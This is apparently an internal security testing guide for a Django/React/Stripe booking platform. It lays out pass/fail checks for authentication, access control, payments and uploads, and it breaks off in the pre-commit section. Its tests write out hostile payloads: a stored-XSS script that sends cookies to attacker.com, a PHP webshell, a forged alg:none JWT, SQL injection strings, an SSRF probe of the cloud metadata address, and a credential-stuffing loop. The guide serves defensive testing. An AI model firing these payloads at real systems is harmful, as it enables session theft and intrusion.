# Security Testing Guide — HomeKonet

> **Audience:** developers, QA engineers, and the security reviewer.
> **Scope:** covers all layers of the HomeKonet stack — Django REST backend, React/TypeScript frontend, Stripe payment flow, file uploads, and infrastructure.
> **When to run:** before every production deployment and whenever a new feature touches auth, payments, or user data.

---

## Table of Contents

1. [Threat Model](#1-threat-model)
2. [Authentication & Session Security](#2-authentication--session-security)
3. [Authorization & Access Control](#3-authorization--access-control)
4. [API Input Validation](#4-api-input-validation)
5. [Business Logic](#5-business-logic)
6. [Payment Security](#6-payment-security)
7. [File Upload Security](#7-file-upload-security)
8. [Data Exposure & Information Leakage](#8-data-exposure--information-leakage)
9. [Transport & Header Security](#9-transport--header-security)
10. [Infrastructure & Configuration](#10-infrastructure--configuration)
11. [Automated Scanning](#11-automated-scanning)
12. [Manual Penetration Testing Procedures](#12-manual-penetration-testing-procedures)
13. [Security Headers — Django Configuration](#13-security-headers--django-configuration)
14. [CI/CD Integration](#14-cicd-integration)
15. [Pre-commit Hooks](#15-pre-commit-hooks)
16. [Incident Response Checklist](#16-incident-response-checklist)
17. [Priority Reference](#17-priority-reference)

---

## 1. Threat Model

### Assets Worth Protecting

| Asset | Impact if Compromised |
|---|---|
| User credentials (email + password) | Account takeover |
| JWT access/refresh tokens | Full session hijack |
| Stripe payment intent secrets | Fraudulent charges |
| Property documents / host identity | Identity fraud |
| Booking PII (guest names, dates, location) | Privacy breach, stalking risk |
| Admin panel access | Platform-wide compromise |
| Host listing approval workflow | Fraudulent listings published |

### Attack Surface

```
Browser  ──►  React SPA  ──►  Django REST API  ──►  PostgreSQL
                │                    │
                │               Stripe API
                │               Cloud Storage (images)
                │               Email provider (SMTP)
                └──► WebSocket (messaging)
```

### Most Likely Threat Actors

- **Malicious guest:** attempts to read another user's bookings, steal a host's contact info, or book at manipulated prices.
- **Malicious host:** lists a fraudulent property, approves their own listing, or extracts guest PII via messaging.
- **External attacker:** credential stuffing, XSS via stored listing content, SSRF via image URLs, payment replay attacks.
- **Insider / compromised admin:** approves listings in bulk, exports user data, escalates their own account.

---

## 2. Authentication & Session Security

### 2.1 Secret Key — Environment Variable

```bash
# Must NOT be hardcoded in settings.py
grep -rn "SECRET_KEY" backend/ --include="*.py" | grep -v "os.environ\|env(\|config("

# .env must be git-ignored
cat .gitignore | grep "\.env"
```

**Pass criteria:** No hardcoded key. `.env` appears in `.gitignore`.

---

### 2.2 JWT Token — httpOnly Cookie

1. Log in via the UI.
2. DevTools → Application → Cookies → select the backend domain.
3. Find `refresh_token`.

**Pass criteria:**
- `HttpOnly` = ✓
- `Secure` = ✓ (in production / HTTPS)
- `SameSite` = `Strict` or `Lax`

**JavaScript inaccessibility test:**
```javascript
// Run in DevTools console — refresh_token must NOT appear
document.cookie
```

**localStorage test:**
```javascript
// Both must return null
localStorage.getItem('accessToken')
localStorage.getItem('refreshToken')
```

---

### 2.3 Token Expiry

**Email verification (24h expiry):**
```sql
-- Expire the token manually
UPDATE authapp_user
SET email_verification_token_expires_at = NOW() - INTERVAL '1 hour'
WHERE email = 'test@example.com';
```
Click the original verification link.
**Pass criteria:** `{"error": "Verification link has expired."}` — HTTP 400.

**Password reset (1h expiry):**
```sql
UPDATE authapp_user
SET password_reset_token_expires_at = NOW() - INTERVAL '2 hours'
WHERE email = 'test@example.com';
```
Submit the reset form with the original token.
**Pass criteria:** `{"error": "Invalid or expired reset token"}` — HTTP 400.

**Access token expiry:**
```bash
# Wait for the short-lived access token to expire, then call a protected endpoint
curl -H "Authorization: Bearer <expired_token>" \
  https://your-backend.com/api/auth/me/
# Pass: 401 Unauthorized — not a silent success
```

---

### 2.4 JWT Algorithm Confusion (alg:none Attack)

```bash
TOKEN="<your_access_token>"

# Craft a token with alg=none and escalated claims
FAKE_HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=')
FAKE_PAYLOAD=$(echo -n '{"user_id":1,"is_admin":true,"is_staff":true}' | base64 | tr -d '=')
FAKE_TOKEN="${FAKE_HEADER}.${FAKE_PAYLOAD}."

curl -H "Authorization: Bearer $FAKE_TOKEN" \
  https://your-backend.com/api/admin/dashboard/
# Pass: 401 Unauthorized
```

---

### 2.5 Brute Force / Rate Limiting

```bash
# 20 rapid failed logins
for i in {1..20}; do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST https://your-backend.com/api/auth/login/ \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"victim@example.com\",\"password\":\"wrong$i\"}"
done

# Pass: 429 Too Many Requests appears before the 20th attempt
```

---

### 2.6 Token Invalidation on Logout

```bash
# 1. Log in and capture the access token
TOKEN=$(curl -s -X POST https://your-backend.com/api/auth/login/ \
  -H "Content-Type: application/json" \
  -d '{"username":"user@example.com","password":"password"}' \
  | jq -r '.access')

# 2. Log out
curl -X POST https://your-backend.com/api/auth/logout/ \
  -H "Authorization: Bearer $TOKEN"

# 3. Attempt to use the old token
curl -H "Authorization: Bearer $TOKEN" \
  https://your-backend.com/api/auth/me/

# Pass: 401 Unauthorized (token blacklisted server-side)
```

---

### 2.7 OTP Entropy and Reuse

1. Trigger the OTP flow.
2. Inspect the OTP: must be exactly 6 digits (0–9).
3. Use the OTP once successfully.
4. Submit the same OTP again immediately.

**Pass criteria:** Second use returns an error. OTP is single-use.

---

## 3. Authorization & Access Control

### 3.1 Vertical Privilege Escalation

```bash
GUEST_TOKEN="<regular_user_token>"

# Admin endpoint
curl -H "Authorization: Bearer $GUEST_TOKEN" \
  https://your-backend.com/api/admin/dashboard/
# Pass: 403 Forbidden

# Pending listings (admin only)
curl -H "Authorization: Bearer $GUEST_TOKEN" \
  https://your-backend.com/api/listings/pending-review/
# Pass: 403 Forbidden

# Approve a listing (admin only)
curl -X POST -H "Authorization: Bearer $GUEST_TOKEN" \
  https://your-backend.com/api/listings/1/approve/
# Pass: 403 Forbidden

# Create a listing (host only)
curl -X POST -H "Authorization: Bearer $GUEST_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"title":"Fake listing"}' \
  https://your-backend.com/api/listings/
# Pass: 403 Forbidden
```

---

### 3.2 Horizontal Privilege Escalation (IDOR)

Replace IDs with ones belonging to other users. **All requests use tokens of the wrong user.**

```bash
USER_A_TOKEN="<user_a_token>"
USER_B_BOOKING_ID="<booking_id_owned_by_user_b>"
HOST_B_LISTING_ID="<listing_id_owned_by_host_b>"

# Read another user's booking
curl -H "Authorization: Bearer $USER_A_TOKEN" \
  https://your-backend.com/api/bookings/$USER_B_BOOKING_ID/
# Pass: 403 or 404

# Modify another host's listing
curl -X PATCH \
  -H "Authorization: Bearer $USER_A_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"title":"Hijacked"}' \
  https://your-backend.com/api/listings/$HOST_B_LISTING_ID/
# Pass: 403 Forbidden

# Delete another user's review
curl -X DELETE \
  -H "Authorization: Bearer $USER_A_TOKEN" \
  https://your-backend.com/api/reviews/<user_b_review_id>/
# Pass: 403 or 404

# Access messages of another conversation
curl -H "Authorization: Bearer $USER_A_TOKEN" \
  https://your-backend.com/api/messages/<user_b_conversation_id>/messages/
# Pass: 403 or 404
```

---

### 3.3 Booking ID Not Exposed in URL

1. Complete a booking.
2. Inspect the `/booking/confirmed` page URL and all network requests.

**Pass criteria:** No sequential integer ID appears in the browser address bar or referrer headers. IDs in API responses should be UUIDs.

---

### 3.4 Host Self-Approval

```bash
HOST_TOKEN="<host_user_token>"
OWN_LISTING_ID="<listing_id_owned_by_this_host>"

curl -X POST \
  -H "Authorization: Bearer $HOST_TOKEN" \
  https://your-backend.com/api/listings/$OWN_LISTING_ID/approve/

# Pass: 403 Forbidden — only admins may approve
```

---

## 4. API Input Validation

### 4.1 SQL Injection

```bash
# Search parameter injection
curl "https://your-backend.com/api/listings/?location=London'%20OR%201=1--"
curl "https://your-backend.com/api/listings/?min_price=0%20UNION%20SELECT%201,2,3--"

# Booking date injection
curl -X POST https://your-backend.com/api/bookings/ \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"listing":1,"start_date":"2026-06-01'\''OR'\''1'\''='\''1"}'

# Pass: Normal results, 400 validation error, or 500 logged server-side (never a DB dump in the response)
```

**Automated:** `sqlmap -u "https://your-backend.com/api/listings/?location=test" --level=3 --risk=2 --batch`

---

### 4.2 Stored XSS

```bash
# Inject script into a listing title
curl -X POST https://your-backend.com/api/listings/ \
  -H "Authorization: Bearer <host_token>" \
  -H "Content-Type: application/json" \
  -d '{
    "title": "<script>fetch(\"https://attacker.com?c=\"+document.cookie)</script>",
    "description": "<img src=x onerror=alert(1)>",
    "propertyType": "apartment"
  }'

# Then view that listing as a different user in a browser
# Pass: Script tags are escaped; no alert dialog; no network request to attacker.com
```

---

### 4.3 Reflected XSS

Navigate to:
```
https://your-frontend.com/search?q=<img+src=x+onerror=alert(document.domain)>
https://your-frontend.com/search?q="><script>alert(1)</script>
```
**Pass criteria:** Input is HTML-encoded. No script executes.

---

### 4.4 Mass Assignment

```bash
# Attempt to set privileged fields during registration
curl -X POST https://your-backend.com/api/auth/register/ \
  -H "Content-Type: application/json" \
  -d '{
    "username": "attacker",
    "email": "attacker@example.com",
    "password": "password123",
    "is_staff": true,
    "is_admin": true,
    "role": "admin"
  }'

# Then log in and check if the account has elevated privileges
curl -H "Authorization: Bearer <attacker_token>" \
  https://your-backend.com/api/admin/dashboard/

# Pass: Registration succeeds as a regular user; admin endpoint returns 403
```

---

### 4.5 Path Traversal

```bash
# Attempt path traversal in a listing image filename
curl -X POST https://your-backend.com/api/listings/1/images/ \
  -H "Authorization: Bearer <host_token>" \
  -F "image=@/dev/urandom;filename=../../etc/passwd;type=image/jpeg"

# Pass: 400 Bad Request — filename rejected or sanitized
```

---

### 4.6 SSRF (Server-Side Request Forgery)

If any endpoint accepts a URL (e.g., image URLs, webhook URLs):
```bash
# Internal metadata service (AWS/GCP/Azure)
curl -X POST https://your-backend.com/api/listings/ \
  -H "Authorization: Bearer <host_token>" \
  -d '{"external_image_url": "http://169.254.169.254/latest/meta-data/"}'

# Internal network scan
curl -X POST https://your-backend.com/api/listings/ \
  -d '{"external_image_url": "http://localhost:5432"}'

# Pass: Request blocked or URL rejected — internal/private IP ranges forbidden
```

---

### 4.7 Invalid / Edge Case Inputs

```bash
# Negative guest count
curl -X POST https://your-backend.com/api/bookings/ \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"listing":1,"guests":-1,"start_date":"2026-06-01","end_date":"2026-06-05"}'
# Pass: 400 Validation error

# End date before start date
curl -X POST https://your-backend.com/api/bookings/ \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"listing":1,"start_date":"2026-06-10","end_date":"2026-06-01"}'
# Pass: 400 — end date must be after start date

# Guests exceeding property capacity
curl -X POST https://your-backend.com/api/bookings/ \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"listing":1,"guests":999,"start_date":"2026-06-01","end_date":"2026-06-05"}'
# Pass: 400 — exceeds maximum occupancy

# Integer overflow / very large numbers
curl -X POST https://your-backend.com/api/bookings/ \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"listing":1,"guests":9999999999,"start_date":"2026-06-01","end_date":"2026-06-05"}'
# Pass: 400 or clamped to valid range
```

---

## 5. Business Logic

### 5.1 Double Booking (Race Condition)

```bash
# Send two simultaneous booking requests for the same room and dates
curl -s -X POST https://your-backend.com/api/bookings/ \
  -H "Authorization: Bearer <user_a_token>" \
  -H "Content-Type: application/json" \
  -d '{"listing":1,"hotel_room":5,"start_date":"2026-07-01","end_date":"2026-07-05","guests":2}' &

curl -s -X POST https://your-backend.com/api/bookings/ \
  -H "Authorization: Bearer <user_b_token>" \
  -H "Content-Type: application/json" \
  -d '{"listing":1,"hotel_room":5,"start_date":"2026-07-01","end_date":"2026-07-05","guests":2}' &

wait

# Pass: Exactly one booking succeeds (HTTP 201); the other returns a 400 availability error.
# The database must use SELECT FOR UPDATE or atomic transactions to prevent the race.
```

---

### 5.2 Price Manipulation

```bash
# Submit a booking with a tampered price
curl -X POST https://your-backend.com/api/bookings/ \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "listing": 1,
    "start_date": "2026-06-01",
    "end_date": "2026-06-05",
    "total_price": 1,
    "base_price": 0.01
  }'

# Pass: Server recomputes price from listing data; booking is rejected or created with the
# correct server-calculated price — never the client-supplied price.
```

---

### 5.3 Booking Status Manipulation

```bash
# Guest attempts to directly mark their booking as "confirmed" (bypassing host approval)
curl -X PATCH \
  -H "Authorization: Bearer <guest_token>" \
  -H "Content-Type: application/json" \
  -d '{"status":"confirmed"}' \
  https://your-backend.com/api/bookings/<booking_id>/

# Pass: 403 Forbidden — status transitions are enforced server-side.
# Only the host (confirm/decline) and admins can change booking status.
```

---

### 5.4 Listing Status Manipulation

```bash
# Host attempts to publish their own listing (bypassing admin review)
curl -X PATCH \
  -H "Authorization: Bearer <host_token>" \
  -H "Content-Type: application/json" \
  -d '{"status":"published"}' \
  https://your-backend.com/api/listings/<listing_id>/

# Pass: 403 Forbidden or field silently ignored — only admins may publish listings.
```

---

### 5.5 Review Without a Booking

```bash
# Attempt to leave a review for a property the user has never booked
curl -X POST https://your-backend.com/api/listings/1/reviews/ \
  -H "Authorization: Bearer <user_with_no_booking_token>" \
  -H "Content-Type: application/json" \
  -d '{"rating":5,"comment":"Free 5-star!"}'

# Pass: 403 or 400 — reviews require a completed stay
```

---

## 6. Payment Security

### 6.1 No Raw Card Data on Server

1. DevTools → Network tab.
2. Complete a real payment flow.
3. Filter requests to your backend domain.
4. Search for: `card_number`, `cardNumber`, `cvv`, `cvc`, `expiry`, `exp_month`, `exp_year`.

**Pass criteria:** None of these fields appear in any request to your backend. They travel only to `api.stripe.com`.

---

### 6.2 Payment Amount Computed Server-Side

```bash
# Intercept the payment-intent creation request and modify the amount
# (Use Burp Suite or browser DevTools to change amount_cents before it's sent)

# Then check the Stripe Dashboard — does the actual charge match the tampered amount?

# Pass: Server recomputes amount_cents from the booking's stored prices.
# The client-submitted amount is ignored.
```

---

### 6.3 Payment Intent Replay

```bash
# Capture a valid payment_intent_id from a completed booking
INTENT_ID="pi_xxxxxxxxxxxxxxxxxxxxxxxx"

# Attempt to confirm it again
curl -X POST https://your-backend.com/api/payments/confirm/ \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"payment_intent_id\": \"$INTENT_ID\"}"

# Pass: 400 or 409 — payment intent already consumed; no duplicate booking created
```

---

### 6.4 Webhook Signature Verification

```bash
# Attempt to send a fake payment success event without the Stripe signature
curl -X POST https://your-backend.com/api/payments/webhook/ \
  -H "Content-Type: application/json" \
  -d '{"type":"payment_intent.succeeded","data":{"object":{"id":"pi_fake","amount":100}}}'

# Pass: 400 or 401 — "Invalid signature"

# Attempt with a tampered payload (valid signature on different payload)
PAYLOAD='{"type":"payment_intent.succeeded","amount":100}'
SIG=$(echo -n "$PAYLOAD" | openssl dgst -sha256 -hmac "your-webhook-secret" | cut -d' ' -f2)
TAMPERED='{"type":"payment_intent.succeeded","amount":999999}'

curl -X POST https://your-backend.com/api/payments/webhook/ \
  -H "Content-Type: application/json" \
  -H "Stripe-Signature: t=1234,v1=$SIG" \
  -d "$TAMPERED"

# Pass: 400 or 401 — signature mismatch detected
```

---

### 6.5 Skip Payment Step

```bash
# POST directly to booking confirmation without completing Stripe payment
curl -X POST https://your-backend.com/api/bookings/ \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"listing":1,"start_date":"2026-06-01","end_date":"2026-06-05","payment_status":"paid"}'

# Pass: Booking is created in "requested" state, NOT "confirmed".
# Payment_status from client is ignored; only the Stripe webhook may mark a booking paid.
```

---

## 7. File Upload Security

### 7.1 Malicious File Type

```bash
# Create a PHP webshell disguised as an image
echo '<?php system($_GET["cmd"]); ?>' > webshell.php

curl -X POST https://your-backend.com/api/listings/1/images/ \
  -H "Authorization: Bearer <host_token>" \
  -F "image=@webshell.php;type=image/jpeg"

# Pass: 400 Bad Request — server validates MIME type by reading file bytes, not just extension or Content-Type header.
```

```bash
# SVG with embedded JavaScript (XSS vector)
echo '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>' > xss.svg

curl -X POST https://your-backend.com/api/listings/1/images/ \
  -H "Authorization: Bearer <host_token>" \
  -F "image=@xss.svg;type=image/svg+xml"

# Pass: 400 or SVG content sanitized before storage/serving
```

---

### 7.2 Oversized File

```bash
# Generate a 25MB file (assuming 10MB limit)
dd if=/dev/urandom of=large.bin bs=1M count=25

curl -X POST https://your-backend.com/api/listings/1/images/ \
  -H "Authorization: Bearer <host_token>" \
  -F "image=@large.bin;type=image/jpeg"

# Pass: 400 or 413 — file too large
```

---

### 7.3 Filename Path Traversal

```bash
curl -X POST https://your-backend.com/api/listings/1/images/ \
  -H "Authorization: Bearer <host_token>" \
  -F $'image=@valid.jpg;filename=../../etc/passwd'

# Pass: 400 Bad Request or filename sanitized (stored with a safe generated name, not the client-supplied name)
```

---

### 7.4 Stored File Accessible Without Auth

```bash
# Get the URL of an uploaded image for a private listing (e.g., a pending_review listing)
FILE_URL="https://your-storage.com/listings/1/private-image.jpg"

# Access it without any authorization header
curl -I "$FILE_URL"

# Pass: 403 if the file should be private; or acceptable if files are served publicly (CDN images).
# Document the expected behavior.
```

---

## 8. Data Exposure & Information Leakage

### 8.1 API Response — PII Over-Exposure

```bash
# List all users — must not be accessible to regular users
curl -H "Authorization: Bearer <regular_user_token>" \
  https://your-backend.com/api/users/

# Pass: 403 Forbidden

# Get another user's profile — verify minimal data is returned
curl -H "Authorization: Bearer <user_a_token>" \
  https://your-backend.com/api/users/<user_b_id>/

# Pass: Returns only public fields (name, avatar, host status).
# Must NOT include: email, phone, password hash, tokens, internal IDs.
```

---

### 8.2 Error Message Leakage

```bash
# Send a malformed request to trigger a server error
curl -X POST https://your-backend.com/api/bookings/ \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d 'INVALID{JSON'

# Pass: Generic error message returned.
# Must NOT include: stack trace, file paths, DB table names, Django version, SQL query.
```

---

### 8.3 DEBUG Mode in Production

```bash
curl https://your-backend.com/api/nonexistent-endpoint-xyz/

# Pass: Generic 404 response — NOT the Django yellow debug page
# Also verify in settings.py: DEBUG = False (via environment variable)
```

---

### 8.4 Sensitive Data in Logs

```bash
# After a login request, check server logs
tail -f /var/log/app/access.log

# Pass: Password is NOT logged. Card numbers are NOT logged.
# Request bodies containing sensitive fields should be redacted in logs.
```

---

### 8.5 Booking ID Enumeration

1. Complete a booking and note the booking ID format.
2. If IDs are sequential integers, an attacker can enumerate all bookings.

**Pass criteria:** Booking IDs are UUIDs or opaque references. The confirmation URL contains no ID at all (it's passed via router state, not the URL).

---

## 9. Transport & Header Security

### 9.1 Security Headers Check

```bash
curl -I https://your-backend.com/api/auth/login/

# Required headers:
# X-Content-Type-Options: nosniff
# X-Frame-Options: DENY
# Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
# Referrer-Policy: strict-origin-when-cross-origin
# Content-Security-Policy: (present and restrictive)
# Permissions-Policy: camera=(), microphone=(), geolocation=(self)
```

Use [securityheaders.com](https://securityheaders.com) or [Mozilla Observatory](https://observatory.mozilla.org) for a graded report (target: **A or A+**).

---

### 9.2 CORS Policy

```bash
# Verify unauthorized origin is rejected
curl -I \
  -H "Origin: https://attacker.com" \
  -H "Access-Control-Request-Method: POST" \
  -X OPTIONS \
  https://your-backend.com/api/auth/login/

# Pass: Access-Control-Allow-Origin does NOT include attacker.com

# Verify wildcard is not used
curl -I https://your-backend.com/api/auth/login/ | grep -i "access-control-allow-origin"
# Pass: Must not be "*" for endpoints that accept credentials
```

---

### 9.3 HTTPS Enforcement

```bash
# Attempt HTTP — must redirect to HTTPS
curl -I http://your-backend.com/api/auth/login/
# Pass: 301 or 302 redirect to https://

# Check for mixed content in the frontend
# Chrome DevTools → Console — should show no "Mixed Content" warnings
```

---

### 9.4 X-Forwarded-For / IP Spoofing

```bash
# If rate limiting is IP-based, ensure spoofed headers don't bypass it
for i in {1..30}; do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST https://your-backend.com/api/auth/login/ \
    -H "X-Forwarded-For: 1.2.3.$i" \
    -H "Content-Type: application/json" \
    -d '{"username":"test@example.com","password":"wrong"}'
done

# Pass: Rate limiting fires regardless of X-Forwarded-For value
# (Django should only trust this header from known proxy IPs via TRUSTED_PROXIES)
```

---

## 10. Infrastructure & Configuration

### 10.1 Environment Variables — Nothing Hardcoded

```bash
# Check for hardcoded secrets in backend code
grep -rn "sk_live_\|pk_live_\|SECRET_KEY\s*=\s*['\"]" backend/ --include="*.py"
grep -rn "password\s*=\s*['\"]" backend/ --include="*.py" | grep -v "test\|example\|placeholder"

# Check git history for accidentally committed secrets
git log --all --oneline | head -20
git grep -i "secret_key\|api_key\|password" $(git rev-list --all)

# Pass: No hardcoded secrets in code or git history
```

---

### 10.2 Dependency Vulnerabilities

```bash
# Backend
pip install safety
safety check -r requirements.txt

# Frontend
cd frontend && npm audit
npm audit --audit-level=high  # fail on high/critical only
```

---

### 10.3 Django Admin Hardening

1. Navigate to `/admin/` in a browser (if Django admin is enabled).
2. Attempt common paths: `/admin/`, `/django-admin/`, `/backend/admin/`.
3. Attempt login with `admin:admin`, `admin:password`, `root:root`.

**Pass criteria:**
- Admin panel is either hidden behind a custom URL or completely disabled.
- Brute force protection on the admin login.
- Admin is only accessible from trusted IP ranges (if possible).

---

### 10.4 PostgreSQL Exposure

```bash
# Verify the database is not directly accessible from the internet
nc -zv your-db-host.example.com 5432
# Pass: Connection refused or timed out from outside the private network
```

---

## 11. Automated Scanning

### 11.1 Backend — Static Analysis

```bash
# Bandit — Python security linter
pip install bandit
bandit -r backend/ -ll -ii
# -ll = medium+ severity, -ii = medium+ confidence
# Review and remediate all HIGH findings

# Safety — known CVEs in dependencies
pip install safety
safety check -r requirements.txt --output=json > safety-report.json

# Semgrep — semantic code patterns for Django
pip install semgrep
semgrep --config=p/django backend/
semgrep --config=p/python backend/
semgrep --config=p/secrets backend/
```

---

### 11.2 Frontend — Static Analysis

```bash
cd frontend

# npm audit
npm audit
npm audit --audit-level=moderate --json > npm-audit.json

# Semgrep for React/TypeScript
semgrep --config=p/react src/
semgrep --config=p/javascript src/
semgrep --config=p/typescript src/

# ESLint security plugin
npm install --save-dev eslint-plugin-security
# Add to .eslintrc: "plugins": ["security"], "extends": ["plugin:security/recommended"]
npx eslint src/ --ext .ts,.tsx
```

---

### 11.3 DAST — OWASP ZAP

```bash
# Baseline scan (passive — does not attack)
docker run -t owasp/zap2docker-stable zap-baseline.py \
  -t https://your-frontend.com \
  -r zap-baseline-report.html

# Full active scan (attacks the target — use ONLY in a staging environment)
docker run -t owasp/zap2docker-stable zap-full-scan.py \
  -t https://your-staging-backend.com \
  -r zap-full-report.html \
  -z "-config api.disablekey=true"

# API scan using OpenAPI spec
docker run -t owasp/zap2docker-stable zap-api-scan.py \
  -t https://your-backend.com/api/schema/ \
  -f openapi \
  -r zap-api-report.html
```

**ZAP GUI approach:**
1. Launch ZAP → Automated Scan → enter target URL.
2. Spider to discover endpoints.
3. Active Scan → review Alerts tab.
4. Remediate all **High** and **Medium** findings before going to production.

---

### 11.4 Container Scanning

```bash
# Trivy — scan Docker images for OS and library CVEs
brew install aquasecurity/trivy/trivy  # or: apt-get install trivy

docker build -t homekonet-backend ./backend
trivy image homekonet-backend --severity HIGH,CRITICAL

docker build -t homekonet-frontend ./frontend
trivy image homekonet-frontend --severity HIGH,CRITICAL

# Pass: No CRITICAL CVEs; HIGH CVEs documented and tracked
```

---

## 12. Manual Penetration Testing Procedures

### 12.1 Burp Suite Setup

1. Install [Burp Suite Community](https://portswigger.net/burp/communitydownload).
2. Configure browser proxy to `127.0.0.1:8080`.
3. Install Burp CA certificate in the browser to intercept HTTPS.
4. Navigate the app and let Burp build the site map.
5. Use the **Repeater** to replay and modify individual requests.
6. Use **Intruder** to fuzz parameters.

---

### 12.2 Auth Bypass Checklist (Burp Repeater)

For each protected API endpoint:
- [ ] Remove `Authorization` header entirely → expect 401
- [ ] Send a valid token for the wrong user → expect 403 or 404
- [ ] Send an expired token → expect 401
- [ ] Send a malformed token (`Bearer AAAA`) → expect 401
- [ ] Change `user_id` in the JWT payload (without re-signing) → expect 401
- [ ] Use a guest token on a host-only endpoint → expect 403
- [ ] Use a host token on an admin-only endpoint → expect 403

---

### 12.3 Credential Stuffing Simulation

```bash
# Install a wordlist (e.g., rockyou.txt top 1000 passwords)
# Test against login endpoint with a real username

while IFS= read -r pass; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST https://your-backend.com/api/auth/login/ \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"target@example.com\",\"password\":\"$pass\"}")
  echo "$CODE $pass"
  if [ "$CODE" = "429" ]; then
    echo "Rate limit triggered after $(grep -c . <<< ".")" && break
  fi
done < top1000-passwords.txt

# Pass: 429 triggers well before the list is exhausted (target: < 10 attempts)
```

---

### 12.4 Full OWASP Top 10 Checklist

| # | Category | Test Method | Status |
|---|---|---|---|
| A01 | Broken Access Control | IDOR tests (§3.1–3.4), privilege escalation | ☐ |
| A02 | Cryptographic Failures | Token storage (§2.2), HTTPS (§9.3), no plaintext passwords | ☐ |
| A03 | Injection | SQL injection (§4.1), XSS (§4.2–4.3) | ☐ |
| A04 | Insecure Design | Business logic tests (§5), double-booking (§5.1) | ☐ |
| A05 | Security Misconfiguration | DEBUG mode (§8.3), headers (§9.1), admin hardening (§10.3) | ☐ |
| A06 | Vulnerable Components | `npm audit`, `safety check`, `trivy` (§11.2–11.4) | ☐ |
| A07 | Auth Failures | Brute force (§2.5), token expiry (§2.3), logout (§2.6) | ☐ |
| A08 | Software/Data Integrity | Webhook signature (§6.4), dependency lock files | ☐ |
| A09 | Security Logging | Log leakage (§8.4), audit trail for bookings and approvals | ☐ |
| A10 | SSRF | Server-side request forgery (§4.6) | ☐ |

---

## 13. Security Headers — Django Configuration

Add to `backend/settings.py` for production:

```python
# Core security switches
DEBUG = env.bool('DEBUG', default=False)
SECURE_SSL_REDIRECT = not DEBUG                          # Redirect HTTP → HTTPS
SECURE_HSTS_SECONDS = 31536000
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
SECURE_HSTS_PRELOAD = True
SECURE_BROWSER_XSS_FILTER = True
SECURE_CONTENT_TYPE_NOSNIFF = True
X_FRAME_OPTIONS = 'DENY'
SESSION_COOKIE_SECURE = True
SESSION_COOKIE_HTTPONLY = True
CSRF_COOKIE_SECURE = True
CSRF_COOKIE_HTTPONLY = True

# Content Security Policy (pip install django-csp)
MIDDLEWARE = [
    'csp.middleware.CSPMiddleware',
    'django.middleware.security.SecurityMiddleware',
    # ... rest of your middleware
]

CSP_DEFAULT_SRC = ("'self'",)
CSP_SCRIPT_SRC  = ("'self'", "https://js.stripe.com")
CSP_FRAME_SRC   = ("'self'", "https://js.stripe.com")
CSP_IMG_SRC     = ("'self'", "data:", "https:", "blob:")
CSP_CONNECT_SRC = ("'self'", "https://api.stripe.com", "wss:")
CSP_FONT_SRC    = ("'self'", "data:")
CSP_STYLE_SRC   = ("'self'", "'unsafe-inline'")   # narrow this when you have a hash strategy
CSP_OBJECT_SRC  = ("'none'",)
CSP_BASE_URI    = ("'self'",)
CSP_REPORT_URI  = "/csp-report/"

# Permissions Policy
PERMISSIONS_POLICY = {
    "camera": [],
    "microphone": [],
    "geolocation": ["self"],
    "payment": ["self", "https://js.stripe.com"],
}
```

---

## 14. CI/CD Integration

Create `.github/workflows/security.yml`:

```yaml
name: Security Checks

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]
  schedule:
    - cron: '0 3 * * 1'   # Weekly Monday 3am UTC — catch new CVEs

jobs:
  backend-security:
    name: Backend — Static Analysis
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up Python 3.11
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Install dependencies
        run: |
          pip install -r requirements.txt
          pip install bandit safety semgrep

      - name: Bandit static analysis
        run: bandit -r backend/ -ll -ii --exit-zero -f json -o bandit-report.json

      - name: Safety — dependency CVEs
        run: safety check -r requirements.txt

      - name: Semgrep — Django patterns
        run: semgrep --config=p/django --config=p/secrets backend/ --error

      - name: Upload bandit report
        uses: actions/upload-artifact@v4
        if: always()
        with:
          name: bandit-report
          path: bandit-report.json

  frontend-security:
    name: Frontend — Static Analysis
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up Node 20
        uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'
          cache-dependency-path: frontend/package-lock.json

      - name: Install dependencies
        run: cd frontend && npm ci

      - name: npm audit (high + critical)
        run: cd frontend && npm audit --audit-level=high

      - name: Semgrep — React/TypeScript
        run: semgrep --config=p/react --config=p/typescript frontend/src/ --error

  docker-scan:
    name: Container Vulnerability Scan
    runs-on: ubuntu-latest
    needs: [backend-security, frontend-security]
    steps:
      - uses: actions/checkout@v4

      - name: Build backend image
        run: docker build -t homekonet-backend:ci ./backend

      - name: Trivy — backend image
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: homekonet-backend:ci
          severity: HIGH,CRITICAL
          exit-code: '1'

  secrets-scan:
    name: Secret Detection
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0   # full history for git-secrets

      - name: Gitleaks — scan for secrets in history
        uses: gitleaks/gitleaks-action@v2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

---

## 15. Pre-commit Hooks

Create `.pre-commit-config.yaml` in the project root:

```yaml
repos:
  # Python security
